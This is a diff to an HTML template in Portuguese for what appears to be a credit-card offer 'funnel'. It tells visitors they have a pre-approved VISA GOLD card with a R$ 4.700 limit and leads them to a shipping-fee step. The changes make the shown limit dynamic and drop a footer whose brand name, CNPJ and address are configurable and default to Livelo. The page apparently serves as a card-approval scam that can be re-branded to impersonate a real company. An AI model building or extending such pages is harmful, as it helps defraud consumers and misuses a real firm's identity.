@@ -434,7 +434,7 @@ Melhor gerente 2023-2024
 <div style="background:var(--pink-dark);border-radius:12px;padding:24px;text-align:center;margin-bottom:20px;color:white;box-shadow:0 8px 24px rgba(229,20,122,0.3)">
 <div style="font-size:0.8rem;font-weight:600;margin-bottom:2px">Seu novo cartão</div>
 <div style="font-size:0.85rem;font-weight:800;margin-bottom:16px">VISA GOLD</div>
-<div id="approved-limit" style="font-size:1.8rem;font-weight:800;letter-spacing:-0.03em">R$ 4.700,00</div>
+<div id="approved-limit" style="font-size:1.8rem;font-weight:800;letter-spacing:-0.03em"><span class="dynamic-limit-full">R$ 4.700,00</span></div>
 </div>
 <div class="hidden" id="approved-frete-val" style="display:none"></div>
 <div class="hidden" id="approved-name-display" style="display:none"></div>
@@ -656,7 +656,7 @@ Continuar
 <span style="font-size:0.85rem;font-weight:700;color:var(--pink)">Cartão Virtual Disponível Hoje</span>
 </div>
 <div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">
-        Você receberá hoje seu cartão virtual com limite de R$ 4.700 para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
+        Você receberá hoje seu cartão virtual com limite de <span class="dynamic-limit-short">R$ 4.700</span> para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
       </div>
 </div>
 
@@ -723,7 +723,7 @@ Continuar
 
 <div style="text-align:center;margin-bottom:24px">
 <div style="font-size:0.85rem;font-weight:600;color:var(--text)">Seu Limite Disponível</div>
-<div style="font-size:1.6rem;font-weight:800;color:var(--pink)">R$ 4.700</div>
+<div style="font-size:1.6rem;font-weight:800;color:var(--pink)"><span class="dynamic-limit-short">R$ 4.700</span></div>
 </div>
 <div class="card-preview-sm" style="margin-bottom:24px;display:flex;justify-content:center">
 <!-- O JS vai injetar o background SVG aqui -->
@@ -960,14 +960,7 @@ window.fetch = encryptedFetch;
     </style>
 
   </main>
-  <footer class="funnel-footer" style="padding: 30px 20px; text-align: center; color: var(--text-muted); font-size: 0.85rem; width: 100%;">
-    <p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
-    <p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
-    <p>© 2026 · Todos os direitos reservados</p>
-  </footer>
-</div>
-</body>
-</html>
+
 <!-- ═══════ SHIPPING SUCCESS (Img 5) ═══════ -->
 <div class="screen" id="screen-shipping-success">
 <div class="step-container" style="justify-content:center;min-height:90vh;max-width:480px;margin:0 auto">
@@ -1005,15 +998,11 @@ window.fetch = encryptedFetch;
 <span style="font-size:0.85rem;font-weight:700;color:var(--pink)">Cartão Virtual Disponível Hoje</span>
 </div>
 <div style="font-size:0.8rem;color:var(--text-muted);line-height:1.4">
-        Você receberá hoje seu cartão virtual com limite de R$ 4.700 para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
+        Você receberá hoje seu cartão virtual com limite de <span class="dynamic-limit-short">R$ 4.700</span> para começar a usar imediatamente, enquanto seu cartão físico está a caminho.
       </div>
 </div>
 
-<footer class="funnel-footer">
-<p>{{ sys_config.get('system_name', 'Livelo') }} | CNPJ: {{ sys_config.get('system_cnpj', '12.888.241/0001-06') }}</p>
-<p>{{ sys_config.get('system_address', 'Alameda Xingu, 512 · Alphaville, Barueri, SP') }}</p>
-<p>© 2025 · Todos os direitos reservados</p>
-</footer>
+
 </div>
 </div>
 
